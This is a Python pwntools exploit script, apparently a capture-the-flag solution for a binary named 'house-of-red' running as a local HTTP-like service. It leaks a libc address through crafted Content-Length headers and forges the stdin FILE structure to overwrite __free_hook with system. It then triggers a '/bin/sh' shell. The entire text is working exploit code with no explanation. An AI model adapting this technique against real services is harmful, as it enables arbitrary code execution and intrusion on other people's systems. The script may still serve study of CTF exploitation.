from pwn import *

libc = ELF("./bin/libc.so.6")

#p = process("./bin/house-of-red")
p = remote("localhost", 9999)

p.sendline("POST /red HTTP/1.1")

p.sendlineafter("200 OK", ("Content-Length: " + str(0x1000) + "\n") * 2 + "X-Debug") 
p.recvuntil("X-Buffer: ")

leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) + 0x00007fdac6ee2000 - 0x7fdac72cdca0

print(hex(leak))


p.sendline("Content-Length: " + str(0x30000)) 

offset = 0x7fa231e63010 - 0x00007fa2312e1000

p.sendline("Content-Length: " + str(-offset + libc.symbols["_IO_2_1_stdin_"] + 7 * 8))
p.sendline()


stdin = leak + libc.symbols["_IO_2_1_stdin_"]
fake_buff = stdin + 3 * 8
p.send((
  p64(0xfbad208b) 
  + p64(fake_buff) + p64(fake_buff - 0x50) 
  + "1" * 8 # fake buffer
  + p64(0) * 3 
  + p64(stdin - 16) # _IO_buf_base
  + p64(leak + libc.symbols["__free_hook"] + 0x100) # _IO_buf_end
).ljust(0x50, "\x00")
)

ui.pause()

fake_buff = stdin - 16

p.send(
  "1" * 8 + "/bin/sh\x00" +
  (
  p64(0xfbad208b) + p64(fake_buff) + p64(fake_buff - 0x1f00) 
  + p64(0) * 4 
  + p64(0) # _IO_buf_base
  + p64(0) 
  + p64(fake_buff + 8) # "/bin/sh"
  ).ljust(libc.symbols["__free_hook"] - libc.symbols["_IO_2_1_stdin_"], "\x00")
  + p64(leak + libc.symbols["system"])
)

p.interactive()
